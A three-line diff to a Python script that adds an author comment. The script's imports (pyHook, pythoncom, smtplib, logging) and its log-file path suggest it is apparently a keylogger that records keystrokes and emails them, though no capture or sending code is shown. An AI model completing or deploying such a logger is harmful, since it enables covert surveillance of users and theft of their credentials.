@@ -1,3 +1,5 @@
+#Author: Nishant Nischaya.
+
 import pyHook, pythoncom, sys, logging, smtplib, os
 
 file_log= 'C:\\important\\log.txt'
